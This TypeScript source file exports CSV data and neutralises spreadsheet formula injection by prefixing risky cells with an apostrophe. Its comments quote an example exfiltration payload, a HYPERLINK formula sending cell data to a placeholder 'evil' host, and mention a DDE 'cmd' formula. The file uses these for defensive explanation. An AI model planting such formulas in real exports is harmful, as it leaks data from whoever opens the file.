export interface CsvColumn<T> {
  key: keyof T | ((row: T) => unknown);
  label: string;
}

/**
 * Characters that make Excel, LibreOffice and Google Sheets treat a cell as a
 * formula rather than text. `\t` and `\r` are included because leading
 * whitespace is stripped before the parser looks at the first real character,
 * so `\t=cmd|…` is evaluated just the same as `=cmd|…`.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/** A plain number — optional sign, digits, optional fraction and exponent. */
const PLAIN_NUMBER = /^[+-]?(\d+(\.\d+)?|\.\d+)([eE][+-]?\d+)?$/;

/**
 * Neutralises CSV injection (a.k.a. formula injection).
 *
 * Almost every string in an export is attacker-reachable: item and supplier
 * names, batch numbers, customer names and remarks are all typed in by staff,
 * and some arrive through the public API or the customer portal. A value like
 * `=HYPERLINK("http://evil/?d="&A1,"Total")` sits inertly in the database and
 * then executes when an owner opens the exported register in a spreadsheet —
 * exfiltrating the row it is pasted next to, or worse via a DDE payload.
 *
 * The mitigation is the conventional one: prefix the cell with an apostrophe,
 * which every spreadsheet reads as "the rest of this cell is literal text" and
 * does not display.
 *
 * Numbers are deliberately exempt. `-1234.50` is a legitimate negative balance
 * in half these reports, and escaping it would turn the column into text and
 * silently break SUM() in the owner's spreadsheet — trading a security bug for
 * an accounting one. A leading `-` or `+` is only dangerous when what follows
 * is not a number, which is exactly what the exemption tests.
 *
 * Round-trips: `stripFormulaGuard()` reverses this, and the CSV importer
 * applies it to every field, so exporting and re-importing returns the
 * original value. See the note there on why that is safe for third-party
 * files too.
 */
function guardFormula(s: string): string {
  if (s === "" || !FORMULA_TRIGGERS.includes(s[0])) return s;
  if (PLAIN_NUMBER.test(s)) return s;
  return `'${s}`;
}

/**
 * Removes the guard apostrophe added by `guardFormula()`.
 *
 * Safe to apply to any CSV, not just ours: a leading apostrophe before a
 * formula trigger is the escape convention spreadsheets themselves use, so a
 * Marg or Vyapar export containing `'=SUM(…)` meant the literal text `=SUM(…)`
 * there too. An apostrophe before anything else — `'s Pharmacy`, say — is left
 * alone, because nothing would have escaped it.
 */
export function stripFormulaGuard(s: string): string {
  if (s.length >= 2 && s[0] === "'" && FORMULA_TRIGGERS.includes(s[1])) {
    return s.slice(1);
  }
  return s;
}

function escapeCsvField(value: unknown): string {
  if (value === null || value === undefined) return "";
  const raw = value instanceof Date ? value.toISOString() : String(value);
  const s = guardFormula(raw);
  // `\r` is quoted alongside `\n`: a bare CR inside a field would otherwise
  // be read as a row terminator by parsers that accept CR line endings.
  if (/[",\n\r]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
  const header = columns.map((c) => escapeCsvField(c.label)).join(",");
  const lines = rows.map((row) =>
    columns
      .map((c) => escapeCsvField(typeof c.key === "function" ? c.key(row) : row[c.key]))
      .join(",")
  );
  return [header, ...lines].join("\r\n") + "\r\n";
}
